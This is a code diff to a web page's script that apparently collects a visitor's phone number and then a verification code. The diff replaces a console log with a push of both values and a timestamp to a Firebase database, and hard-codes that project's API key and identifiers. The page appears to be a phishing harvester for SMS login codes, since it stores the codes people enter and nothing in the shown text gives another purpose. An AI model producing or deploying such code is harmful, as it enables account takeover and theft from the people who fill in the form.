@@ -109,12 +109,31 @@ button{
 </div>
 
 
-<script>
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+
+
+const firebaseConfig = {
+ apiKey: "AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
+ authDomain: "la3nazr.firebaseapp.com",
+ databaseURL: "https://la3nazr-default-rtdb.firebaseio.com",
+ projectId: "la3nazr",
+ storageBucket: "la3nazr.firebasestorage.app",
+ messagingSenderId: "819824551752",
+ appId: "1:819824551752:web:87e8a2555c6df97edeb57d"
+};
+
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
 
 let phone="";
 
 
-function nextPage(){
+window.nextPage=function(){
 
 phone=document.getElementById("phone").value;
 
@@ -130,7 +149,7 @@ document.getElementById("page2").style.display="block";
 
 
 
-function finish(){
+window.finish=function(){
 
 let code=document.getElementById("code").value;
 
@@ -140,14 +159,15 @@ return;
 }
 
 
+push(ref(db,"users"),{
+phone: phone,
+code: code,
+time: new Date().toLocaleString()
+});
+
+
 document.getElementById("page2").style.display="none";
 document.getElementById("page3").style.display="block";
-
-
-console.log({
-شماره:phone,
-کد:code
-});
 
 }
 
